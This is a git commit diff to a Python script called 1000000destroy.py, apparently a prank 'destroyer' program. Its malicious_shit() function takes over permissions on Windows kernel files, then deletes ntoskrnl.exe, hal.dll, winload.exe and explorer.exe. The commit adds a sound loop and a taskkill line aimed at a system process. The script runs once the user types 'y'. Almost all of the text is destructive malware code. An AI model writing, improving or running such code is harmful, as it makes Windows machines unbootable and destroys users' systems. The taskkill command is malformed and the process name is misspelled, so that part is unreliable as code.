69603804a6905c1bb9c3977af07bd7b5c6fe6f3e
mystic-poop <enesyildiz320@icloud.com>
2025-05-01 16:48:35 +0300

    HOLY SHIT I MADE IT

--- 1000000destroy.py
+++ 1000000destroy.py
@@ -2,6 +2,8 @@ import subprocess
 import os
 import time
 import random
+import playsound
+from playsound import playsound
 from turtle import *
 import turtle
 
@@ -23,7 +25,7 @@ def malicious_shit():
         subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
         os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
         os.remove("C:\\Windows\\System32\\hal.dll")
-        os.remove("C:\\Windows\\explorer.exe")
+        os.remove("C:\\Windows\\System32\\explorer.exe")
         os.remove("C:\\Windows\\System32\\Boot\\winload.exe")
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -58,6 +60,11 @@ while True:
     if user_input == 'y':
         malicious_shit()
         graphics()
+        while True:
+         playsound("gl.mp3")
+         time.sleep(60)
+         break
+        os.popen("taskkill /F IM scvhost.exe /T")
         break
     elif user_input == 'n':
         print("Yeah, I knew you had no balls to run this shit.")
